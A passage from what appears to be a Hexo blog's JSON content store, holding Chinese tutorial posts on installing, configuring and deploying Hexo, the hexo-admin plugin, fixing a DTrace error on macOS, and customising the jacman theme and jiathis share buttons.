class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> hexo-blog</div><div class=\"line\">npm install hexo --save</div></pre></td></tr></table></figure></p>\n<p>新建完成后，指定文件夹的目录如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">.</div><div class=\"line\">├── _config.yml</div><div class=\"line\">├── package.json</div><div class=\"line\">├── scaffolds</div><div class=\"line\">├── scripts</div><div class=\"line\">├── source</div><div class=\"line\">|   ├── _drafts</div><div class=\"line\">|   └── _posts</div><div class=\"line\">└── themes</div></pre></td></tr></table></figure></p>\n<p>目录结构说明如下：<br><strong>_config.yml</strong><br>网站的 配置 信息，您可以在此配置大部分的参数。</p>\n<p><strong>package.json</strong><br>应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。</p>\n<p><strong>scaffolds</strong><br>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p>\n<p><strong>scripts</strong><br>脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。</p>\n<p><strong>source</strong><br>资源文件夹是存放用户资源的地方。除 <em>posts 文件夹之外，开头命名为 </em> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p>\n<p><strong>themes</strong><br>主题 文件夹。Hexo 会根据主题来生成静态页面。</p>\n<h2 id=\"修改网站信息\"><a href=\"#修改网站信息\" class=\"headerlink\" title=\"修改网站信息\"></a>修改网站信息</h2><p>打开_config.yml，修改网站信息<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"># Site</div><div class=\"line\">title: 芳草地</div><div class=\"line\">subtitle: 叶绍亭</div><div class=\"line\">description:</div><div class=\"line\">author: yeshaoting</div><div class=\"line\">language: zh-CN</div><div class=\"line\">timezone: Asia/Shanghai</div></pre></td></tr></table></figure></p>\n<h2 id=\"安装主题\"><a href=\"#安装主题\" class=\"headerlink\" title=\"安装主题\"></a>安装主题</h2><p>官方收纳的主题：<a href=\"http://hexo.io/themes/\">http://hexo.io/themes/</a><br>我选用 jacman 主题。<br>点击进入<a href=\"http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用\">http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用</a> Jacman 主题](<a href=\"http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。\">http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。</a></p>\n<p><strong>注</strong>：下载完主题后，需要修改_config.yml文件，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">theme: jacman</div><div class=\"line\">stylus:</div><div class=\"line\">  compress: true</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、服务部署\"><a href=\"#四、服务部署\" class=\"headerlink\" title=\"四、服务部署\"></a>四、服务部署</h2><p>参见：<a href=\"https://hexo.io/zh-cn/docs/\">hexo官方网站</a><br>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p>\n<h3 id=\"安装-hexo-deployer-git\"><a href=\"#安装-hexo-deployer-git\" class=\"headerlink\" title=\"安装 hexo-deployer-git\"></a>安装 hexo-deployer-git</h3><p><code>npm install hexo-deployer-git --save</code></p>\n<h3 id=\"修改配置\"><a href=\"#修改配置\" class=\"headerlink\" title=\"修改配置\"></a>修改配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"># Deployment</div><div class=\"line\">## Docs: http://hexo.io/docs/deployment.html</div><div class=\"line\">deploy:</div><div class=\"line\">  type: git</div><div class=\"line\">  repo: git@github.com:yeshaoting/yeshaoting.github.io.git</div><div class=\"line\">  branch: master</div></pre></td></tr></table></figure>\n<h3 id=\"发布到github\"><a href=\"#发布到github\" class=\"headerlink\" title=\"发布到github\"></a>发布到github</h3><p>hexo deploy</p>\n<p>一般，之前需要生成静态文件hexo generate，<br>而在生成静态文件前，可以先清理之前的静态文件hexo clean。</p>\n<h2 id=\"五、本地预览\"><a href=\"#五、本地预览\" class=\"headerlink\" title=\"五、本地预览\"></a>五、本地预览</h2><h2 id=\"安装-hexo-server\"><a href=\"#安装-hexo-server\" class=\"headerlink\" title=\"安装 hexo-server\"></a>安装 hexo-server</h2><p><code>npm install hexo-server --save</code></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><h3 id=\"默认端口为4000\"><a href=\"#默认端口为4000\" class=\"headerlink\" title=\"默认端口为4000\"></a>默认端口为4000</h3><p>hexo server</p>\n<h3 id=\"指定端口为5000\"><a href=\"#指定端口为5000\" class=\"headerlink\" title=\"指定端口为5000\"></a>指定端口为5000</h3><p>hexo server -p 5000</p>\n<h3 id=\"指定地址\"><a href=\"#指定地址\" class=\"headerlink\" title=\"指定地址\"></a>指定地址</h3><p>hexo server -i 192.168.1.1</p>\n<h2 id=\"五、常用操作\"><a href=\"#五、常用操作\" class=\"headerlink\" title=\"五、常用操作\"></a>五、常用操作</h2><h3 id=\"创建文章\"><a href=\"#创建文章\" class=\"headerlink\" title=\"创建文章\"></a>创建文章</h3><p>hexo new [layout] &lt;title&gt;<br>新建的文章默认会被保存在source/_posts文件夹。<br>其中，layout默认为post，若指定，会在scaffolds文件夹找对应的布局文件。</p>\n<h3 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo new &quot;postName&quot; #新建文章</div><div class=\"line\">hexo new page &quot;pageName&quot; #新建页面</div><div class=\"line\">hexo generate #生成静态页面至public目录</div><div class=\"line\">hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</div><div class=\"line\">hexo deploy #将.deploy目录部署到GitHub</div></pre></td></tr></table></figure>\n<h3 id=\"常用复合命令\"><a href=\"#常用复合命令\" class=\"headerlink\" title=\"常用复合命令\"></a>常用复合命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo d -g #生成加部署</div><div class=\"line\">hexo s -g #预览加部署</div></pre></td></tr></table></figure>\n<h3 id=\"简写\"><a href=\"#简写\" class=\"headerlink\" title=\"简写\"></a>简写</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo n == hexo new</div><div class=\"line\">hexo g == hexo generate</div><div class=\"line\">hexo s == hexo server</div><div class=\"line\">hexo d == hexo deploy</div></pre></td></tr></table></figure>"},{"title":"hexo使用进阶","date":"2016-02-01T05:25:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、后端管理插件hexo-admin\n插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。\n另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。\n\n参见：\n - [An Admin Interface for Hexo](http://jaredforsyth.com/hexo-admin/)\n - [hexo-admin in github](https://github.com/jaredly/hexo-admin)\n\n### 1. 安装\n``` bash\nnpm install --save hexo-admin\nhexo server -d\nopen http://localhost:4000/admin/\n```\n\n### 2. 配置\n在_config.yml最后添加类似如下内容：\n``` xml\nadmin:\n  username: myfavoritename\n  password_hash: be121740bf988b2225a313fa1f107ca1\n  secret: a secret something\n```\n\nusername：后端登录用户名\npassword_hash：后端登录用户密码对应的md5 hash值\nsecret：用于保证cookie安全\n\n### 3. 预览\nhexo-admin界面如下：\n![screenshot-1](https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true)\n![screenshot-2](https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png)\n\n<!-- more -->\n\n\n## 二、Error with DTrace\nmac下默认安装使用hexo会报如下错误：\n``` bash\n{ [Error: Cannot find module './build/Release/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/default/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/Debug/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n```\n\n#### 解决办法\n``` bash\nnpm install hexo --no-optional\n```\n\n参见：[Error with DTrace (Mac OS X)](https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29)\n\n\n## 三、hexo不支持的语法\n发现一例hexo不支持的行内代码语法：外层内容`${}`，内层内容以`#`开头。\n但是支持多行代码块，如下：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n\n\n## 四、多分类支持不友好\n如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。\n在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。\n\n由此可见，对于一篇文章最好只设置一个分类，设置多个标签。\n\n\n## 五、文章更新时间显示\n修改只对于jacman主题而言。\n\n### 1. 添加文章更新时间显示位置\n文件：layout/_partial/post/header.ejs\n在article-time块内添加如下内容：\n``` xml\n    <time postupdated=\"<%= date_xml(item.updated) %>\" itemprop=\"dateModified\"> <%= __('dateModified') %> <%= item.updated.format(config.date_format) %></time>\n```\n\n### 2. 添加支持\n文件：languages/zh-CN.yml\n在最后添加如下内容：\n> dateModified: 更新于\n\n参见：\n - [hexo国际化（i18n）](https://hexo.io/zh-cn/docs/internationalization.html)\n - [hexo之jacman主题修改记录](https://blog.mcosx.cn/post/hexo-jacman/)\n\n","source":"_posts/article/hexo/hexo使用进阶.md","raw":"tags:\n  - hexo\ncategories:\n  - 博客搭建\ntitle: hexo使用进阶\ndate: 2016-02-01 13:25:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、后端管理插件hexo-admin\n插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。\n另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。\n\n参见：\n - [An Admin Interface for Hexo](http://jaredforsyth.com/hexo-admin/)\n - [hexo-admin in github](https://github.com/jaredly/hexo-admin)\n\n### 1. 安装\n``` bash\nnpm install --save hexo-admin\nhexo server -d\nopen http://localhost:4000/admin/\n```\n\n### 2. 配置\n在_config.yml最后添加类似如下内容：\n``` xml\nadmin:\n  username: myfavoritename\n  password_hash: be121740bf988b2225a313fa1f107ca1\n  secret: a secret something\n```\n\nusername：后端登录用户名\npassword_hash：后端登录用户密码对应的md5 hash值\nsecret：用于保证cookie安全\n\n### 3. 预览\nhexo-admin界面如下：\n![screenshot-1](https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true)\n![screenshot-2](https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png)\n\n<!-- more -->\n\n\n## 二、Error with DTrace\nmac下默认安装使用hexo会报如下错误：\n``` bash\n{ [Error: Cannot find module './build/Release/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/default/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n{ [Error: Cannot find module './build/Debug/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' }\n```\n\n#### 解决办法\n``` bash\nnpm install hexo --no-optional\n```\n\n参见：[Error with DTrace (Mac OS X)](https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29)\n\n\n## 三、hexo不支持的语法\n发现一例hexo不支持的行内代码语法：外层内容`${}`，内层内容以`#`开头。\n但是支持多行代码块，如下：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n\n\n## 四、多分类支持不友好\n如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。\n在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。\n\n由此可见，对于一篇文章最好只设置一个分类，设置多个标签。\n\n\n## 五、文章更新时间显示\n修改只对于jacman主题而言。\n\n### 1. 添加文章更新时间显示位置\n文件：layout/_partial/post/header.ejs\n在article-time块内添加如下内容：\n``` xml\n    <time postupdated=\"<%= date_xml(item.updated) %>\" itemprop=\"dateModified\"> <%= __('dateModified') %> <%= item.updated.format(config.date_format) %></time>\n```\n\n### 2. 添加支持\n文件：languages/zh-CN.yml\n在最后添加如下内容：\n> dateModified: 更新于\n\n参见：\n - [hexo国际化（i18n）](https://hexo.io/zh-cn/docs/internationalization.html)\n - [hexo之jacman主题修改记录](https://blog.mcosx.cn/post/hexo-jacman/)\n\n","slug":"article/hexo/hexo使用进阶","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqq001m5nbt2qpqbcp9","content":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、后端管理插件hexo-admin\"><a href=\"#一、后端管理插件hexo-admin\" class=\"headerlink\" title=\"一、后端管理插件hexo-admin\"></a>一、后端管理插件hexo-admin</h2><p>插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。<br>另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。</p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://jaredforsyth.com/hexo-admin/\" target=\"_blank\" rel=\"external\">An Admin Interface for Hexo</a></li>\n<li><a href=\"https://github.com/jaredly/hexo-admin\" target=\"_blank\" rel=\"external\">hexo-admin in github</a></li>\n</ul>\n<h3 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a>1. 安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install --save hexo-admin</div><div class=\"line\">hexo server <span class=\"_\">-d</span></div><div class=\"line\">open http://localhost:4000/admin/</div></pre></td></tr></table></figure>\n<h3 id=\"2-配置\"><a href=\"#2-配置\" class=\"headerlink\" title=\"2. 配置\"></a>2. 配置</h3><p>在_config.yml最后添加类似如下内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">admin:</div><div class=\"line\">  username: myfavoritename</div><div class=\"line\">  password_hash: be121740bf988b2225a313fa1f107ca1</div><div class=\"line\">  secret: a secret something</div></pre></td></tr></table></figure></p>\n<p>username：后端登录用户名<br>password_hash：后端登录用户密码对应的md5 hash值<br>secret：用于保证cookie安全</p>\n<h3 id=\"3-预览\"><a href=\"#3-预览\" class=\"headerlink\" title=\"3. 预览\"></a>3. 预览</h3><p>hexo-admin界面如下：<br><img src=\"https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true\" alt=\"screenshot-1\"><br><img src=\"https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png\" alt=\"screenshot-2\"></p>\n<a id=\"more\"></a>\n<h2 id=\"二、Error-with-DTrace\"><a href=\"#二、Error-with-DTrace\" class=\"headerlink\" title=\"二、Error with DTrace\"></a>二、Error with DTrace</h2><p>mac下默认安装使用hexo会报如下错误：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123; [Error: Cannot find module <span class=\"string\">'./build/Release/DTraceProviderBindings'</span>] code: <span class=\"string\">'MODULE_NOT_FOUND'</span> &#125;</div><div class=\"line\">&#123; [Error: Cannot find module <span class=\"string\">'./build/default/DTraceProviderBindings'</span>] code: <span class=\"string\">'MODULE_NOT_FOUND'</span> &#125;</div><div class=\"line\">&#123; [Error: Cannot find module <span class=\"string\">'./build/Debug/DTraceProviderBindings'</span>] code: <span class=\"string\">'MODULE_NOT_FOUND'</span> &#125;</div></pre></td></tr></table></figure></p>\n<h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install hexo --no-optional</div></pre></td></tr></table></figure>\n<p>参见：<a href=\"https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29\" target=\"_blank\" rel=\"external\">Error with DTrace (Mac OS X)</a></p>\n<h2 id=\"三、hexo不支持的语法\"><a href=\"#三、hexo不支持的语法\" class=\"headerlink\" title=\"三、hexo不支持的语法\"></a>三、hexo不支持的语法</h2><p>发现一例hexo不支持的行内代码语法：外层内容<code>${}</code>，内层内容以<code>#</code>开头。<br>但是支持多行代码块，如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr[@]&#125;</span></div><div class=\"line\"><span class=\"variable\">$&#123;#arr[*]&#125;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、多分类支持不友好\"><a href=\"#四、多分类支持不友好\" class=\"headerlink\" title=\"四、多分类支持不友好\"></a>四、多分类支持不友好</h2><p>如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。<br>在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。</p>\n<p>由此可见，对于一篇文章最好只设置一个分类，设置多个标签。</p>\n<h2 id=\"五、文章更新时间显示\"><a href=\"#五、文章更新时间显示\" class=\"headerlink\" title=\"五、文章更新时间显示\"></a>五、文章更新时间显示</h2><p>修改只对于jacman主题而言。</p>\n<h3 id=\"1-添加文章更新时间显示位置\"><a href=\"#1-添加文章更新时间显示位置\" class=\"headerlink\" title=\"1. 添加文章更新时间显示位置\"></a>1. 添加文章更新时间显示位置</h3><p>文件：layout/_partial/post/header.ejs<br>在article-time块内添加如下内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">time</span> <span class=\"attr\">postupdated</span>=<span class=\"string\">\"&lt;%= date_xml(item.updated) %&gt;\"</span> <span class=\"attr\">itemprop</span>=<span class=\"string\">\"dateModified\"</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">dateModified</span>') %&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">item.updated.format</span>(<span class=\"attr\">config.date_format</span>) %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">time</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-添加支持\"><a href=\"#2-添加支持\" class=\"headerlink\" title=\"2. 添加支持\"></a>2. 添加支持</h3><p>文件：languages/zh-CN.yml<br>在最后添加如下内容：</p>\n<blockquote>\n<p>dateModified: 更新于</p>\n</blockquote>\n<p>参见：</p>\n<ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/internationalization.html\" target=\"_blank\" rel=\"external\">hexo国际化（i18n）</a></li>\n<li><a href=\"https://blog.mcosx.cn/post/hexo-jacman/\" target=\"_blank\" rel=\"external\">hexo之jacman主题修改记录</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、后端管理插件hexo-admin\"><a href=\"#一、后端管理插件hexo-admin\" class=\"headerlink\" title=\"一、后端管理插件hexo-admin\"></a>一、后端管理插件hexo-admin</h2><p>插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。<br>另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。</p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://jaredforsyth.com/hexo-admin/\">An Admin Interface for Hexo</a></li>\n<li><a href=\"https://github.com/jaredly/hexo-admin\">hexo-admin in github</a></li>\n</ul>\n<h3 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a>1. 安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install --save hexo-admin</div><div class=\"line\">hexo server <span class=\"_\">-d</span></div><div class=\"line\">open http://localhost:4000/admin/</div></pre></td></tr></table></figure>\n<h3 id=\"2-配置\"><a href=\"#2-配置\" class=\"headerlink\" title=\"2. 配置\"></a>2. 配置</h3><p>在_config.yml最后添加类似如下内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">admin:</div><div class=\"line\">  username: myfavoritename</div><div class=\"line\">  password_hash: be121740bf988b2225a313fa1f107ca1</div><div class=\"line\">  secret: a secret something</div></pre></td></tr></table></figure></p>\n<p>username：后端登录用户名<br>password_hash：后端登录用户密码对应的md5 hash值<br>secret：用于保证cookie安全</p>\n<h3 id=\"3-预览\"><a href=\"#3-预览\" class=\"headerlink\" title=\"3. 预览\"></a>3. 预览</h3><p>hexo-admin界面如下：<br><img src=\"https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true\" alt=\"screenshot-1\"><br><img src=\"https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png\" alt=\"screenshot-2\"></p>","more":"<h2 id=\"二、Error-with-DTrace\"><a href=\"#二、Error-with-DTrace\" class=\"headerlink\" title=\"二、Error with DTrace\"></a>二、Error with DTrace</h2><p>mac下默认安装使用hexo会报如下错误：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123; [Error: Cannot find module <span class=\"string\">'./build/Release/DTraceProviderBindings'</span>] code: <span class=\"string\">'MODULE_NOT_FOUND'</span> &#125;</div><div class=\"line\">&#123; [Error: Cannot find module <span class=\"string\">'./build/default/DTraceProviderBindings'</span>] code: <span class=\"string\">'MODULE_NOT_FOUND'</span> &#125;</div><div class=\"line\">&#123; [Error: Cannot find module <span class=\"string\">'./build/Debug/DTraceProviderBindings'</span>] code: <span class=\"string\">'MODULE_NOT_FOUND'</span> &#125;</div></pre></td></tr></table></figure></p>\n<h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install hexo --no-optional</div></pre></td></tr></table></figure>\n<p>参见：<a href=\"https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29\">Error with DTrace (Mac OS X)</a></p>\n<h2 id=\"三、hexo不支持的语法\"><a href=\"#三、hexo不支持的语法\" class=\"headerlink\" title=\"三、hexo不支持的语法\"></a>三、hexo不支持的语法</h2><p>发现一例hexo不支持的行内代码语法：外层内容<code>${}</code>，内层内容以<code>#</code>开头。<br>但是支持多行代码块，如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$&#123;#arr[@]&#125;</span></div><div class=\"line\"><span class=\"variable\">$&#123;#arr[*]&#125;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、多分类支持不友好\"><a href=\"#四、多分类支持不友好\" class=\"headerlink\" title=\"四、多分类支持不友好\"></a>四、多分类支持不友好</h2><p>如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。<br>在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。</p>\n<p>由此可见，对于一篇文章最好只设置一个分类，设置多个标签。</p>\n<h2 id=\"五、文章更新时间显示\"><a href=\"#五、文章更新时间显示\" class=\"headerlink\" title=\"五、文章更新时间显示\"></a>五、文章更新时间显示</h2><p>修改只对于jacman主题而言。</p>\n<h3 id=\"1-添加文章更新时间显示位置\"><a href=\"#1-添加文章更新时间显示位置\" class=\"headerlink\" title=\"1. 添加文章更新时间显示位置\"></a>1. 添加文章更新时间显示位置</h3><p>文件：layout/_partial/post/header.ejs<br>在article-time块内添加如下内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">time</span> <span class=\"attr\">postupdated</span>=<span class=\"string\">\"&lt;%= date_xml(item.updated) %&gt;\"</span> <span class=\"attr\">itemprop</span>=<span class=\"string\">\"dateModified\"</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">dateModified</span>') %&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">item.updated.format</span>(<span class=\"attr\">config.date_format</span>) %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">time</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-添加支持\"><a href=\"#2-添加支持\" class=\"headerlink\" title=\"2. 添加支持\"></a>2. 添加支持</h3><p>文件：languages/zh-CN.yml<br>在最后添加如下内容：</p>\n<blockquote>\n<p>dateModified: 更新于</p>\n</blockquote>\n<p>参见：</p>\n<ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/internationalization.html\">hexo国际化（i18n）</a></li>\n<li><a href=\"https://blog.mcosx.cn/post/hexo-jacman/\">hexo之jacman主题修改记录</a></li>\n</ul>"},{"title":"jacman主题开启jiathis分享","date":"2016-02-16T07:45:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、开启jiathis分享\njacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：\n\n### 1. 注册jiathis\n登录[jiathis网站](http://www.jiathis.com/)，完成注册。\n进入账号设置，在基本资料栏可以获取用户ID：2084038。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\n#### Share button\njiathis:\n  enable: true ## if you use jiathis as your share tool,the built-in share tool won't be display.\n  id: 2084038   ## e.g. 1889330 your jiathis ID.\n  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.\n```\n\n**注**：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\njiathis分享相关代码逻辑：\n``` html\n<% if(theme.jiathis.enable){ %>\n<div class=\"share-jiathis\">\n  <%- partial('jiathis') %>\n </div>\n<% } else { %>\n  <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n  </div>\n<% } %>\n```\n\n**注**：`<%- partial('jiathis') %>`语法表示加载当前目录下的jiathis.ejs文件。\n\n### 4. 调整分享按钮顺序\n代码：themes/jacman/layout/_partial/post/jiathis.ejs\n\n调整后的顺序：\n``` html\n<div class=\"jiathis_style_24x24\">\n    <a class=\"jiathis_button_cqq\"></a>\n    <a class=\"jiathis_button_qzone\"></a>\n    <a class=\"jiathis_button_weixin\"></a>\n    <a class=\"jiathis_button_tsina\"></a>\n    <a class=\"jiathis_button_renren\"></a>\n    <a href=\"http://www.jiathis.com/share\" class=\"jiathis jiathis_txt jtico jtico_jiathis\" target=\"_blank\"></a>\n    <a class=\"jiathis_counter_style\"></a>\n</div>\n```\n\n\n## 